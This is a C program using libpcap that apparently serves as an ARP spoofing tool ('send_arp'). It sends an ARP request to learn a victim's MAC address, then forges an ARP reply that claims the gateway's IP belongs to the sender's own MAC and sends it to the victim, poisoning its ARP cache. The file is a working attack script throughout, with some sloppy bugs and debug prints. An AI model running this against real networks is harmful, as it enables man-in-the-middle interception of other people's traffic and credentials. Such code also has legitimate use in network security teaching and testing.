#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include<net/ethernet.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include"get_mac.h"
#include"get_ip.h"
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ETHERTYPE_ARP 0x0806
typedef struct _arp_hdr arp_hdr;
struct _arp_hdr{
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t opcode;
 	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

int main(int argc, char *argv[])
{
		pcap_t *handle;			/* Session handle */
		char *dev;			/* The device to sniff on */
		char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
		struct bpf_program fp;		/* The compiled filter */
		char filter_exp[] = "port 80";	/* The filter expression */
		bpf_u_int32 mask;		/* Our netmask */
		bpf_u_int32 net;		/* Our IP */
		struct pcap_pkthdr *header;	/* The header that pcap gives us */
		u_char packet[1000];		/* The actual packet */
		u_char Attack_packet[1000];		/* The actual packet */
		const u_char *p;		
		int i;
		uint8_t src_ip[4], src_mac[6], dst_mac[6], ether_frame[IP_MAXPACKET];
		uint8_t dst_ip[4];
		uint8_t gate_ip[4];
		//struct ifreq ifr;
		/*printf("src_ip : %d.%d.%d.%d\n", (int)src_ip[0], (int)src_ip[1], (int)src_ip[2], (int)src_ip[3]);  
		printf("src_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
printf("dst_ip : %s", argv[2]);*/		

		int Res;
		arp_hdr arphdr ;
		int cnt=0;
		char dot='.';
		if(argc!=4)
		{
			perror("Check argument! (./send_arp <interface> <sender ip> <target ip>)\n");
			return 2;
		}

		s_getMacAddress(argv[1], src_mac);	 	
		s_getIpAddress(argv[1], src_ip);
		sscanf(argv[3], "%d.%d.%d.%d", &gate_ip[0],&gate_ip[1],&gate_ip[2],&gate_ip[3]);
		sscanf(argv[2], "%d.%d.%d.%d", &dst_ip[0],&dst_ip[1],&dst_ip[2],&dst_ip[3]);
		/* Define the device */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(2);
		}
		/* Find the properties for the device */
		if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
			fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
			net = 0;
			mask = 0;
		}
		/* Open the session in promiscuous mode */
		handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
			return(2);
		}
		memset(packet, 0, sizeof(packet));
		struct ether_header* ehP = (struct ether_header *)packet;
		
		ehP->ether_type = htons(ETHERTYPE_ARP);
		for(i=0; i<4; i++)
			printf("%d.", gate_ip[i]);
		printf("\n");
		for(i=0; i<6; i++){
			ehP->ether_dhost[i]=0xff;
			arphdr.target_mac[i]=0x00;
		}
		for(i=0; i<6; i++){
			ehP->ether_shost[i]=src_mac[i];
			arphdr.sender_mac[i]=src_mac[i];
		}
		arphdr.htype = htons(1);
		arphdr.ptype = htons(ETH_P_IP);
		arphdr.hlen=6;
		arphdr.plen=4;
		arphdr.opcode = htons(ARP_REQUEST);
		for(i=0; i<4; i++){
			arphdr.sender_ip[i]=src_ip[i];
			arphdr.target_ip[i]=dst_ip[i];
		}

		memcpy(packet, ehP, sizeof(ehP));		
		memcpy(packet+14, &arphdr, sizeof(arphdr));
		
		if(pcap_sendpacket(handle,packet, 42)!=0)
			{
				printf("error");
			}
		while((Res=pcap_next_ex(handle, &header, &p))>=0)
		{
			if(Res==0)
				continue;
			printf("A");
			
			struct ether_header* eh = (struct ether_header *)p;
			if(eh->ether_type==htons(ETHERTYPE_ARP)) printf("AB");
			for(i=0; i<6; i++)
				dst_mac[i]=eh->ether_shost[i];
			break;
			
		}

		for(i=0; i<6; i++)
			printf("%02x:", dst_mac[i]);
		pcap_close(handle);
		////////////////////////////////////////
dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return(2);
		}
		/* Find the properties for the device */
		if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
			fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
			net = 0;
			mask = 0;
		}
		/* Open the session in promiscuous mode */
		handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
			return(2);
		}
		memset(packet, 0, sizeof(packet));
		arp_hdr Attack_arphdr ;
		
		struct ether_header* Attack_ehP = (struct ether_header *)Attack_packet;
		
		Attack_ehP->ether_type = htons(ETHERTYPE_ARP);
		
		for(i=0; i<6; i++){
			Attack_ehP->ether_dhost[i]=dst_mac[i];
			Attack_arphdr.target_mac[i]=dst_mac[i];
			printf("%02x:", Attack_ehP->ether_dhost[i]);
		}
		for(i=0; i<6; i++){
			Attack_ehP->ether_shost[i]=src_mac[i];
			Attack_arphdr.sender_mac[i]=src_mac[i];
		}
		Attack_arphdr.htype = htons(1);
		Attack_arphdr.ptype = htons(ETH_P_IP);
		Attack_arphdr.hlen=6;
		Attack_arphdr.plen=4;
		Attack_arphdr.opcode = htons(ARP_REPLY);
		for(i=0; i<4; i++){
			Attack_arphdr.sender_ip[i]=gate_ip[i];//
			Attack_arphdr.target_ip[i]=dst_ip[i];
			printf("%d.", Attack_arphdr.sender_ip[i]);
		}

		memcpy(Attack_packet, Attack_ehP, sizeof(Attack_ehP));		
		memcpy(Attack_packet+14, &Attack_arphdr, sizeof(Attack_arphdr));
		
		if(pcap_sendpacket(handle,Attack_packet, 42)!=0)
			{
				printf("error");
			}
		else
			printf("clear\n\n");

		for(i=0; i<42; i++)
			printf("%02x ", Attack_packet[i]);
		pcap_close(handle);
		return(0);
	 }

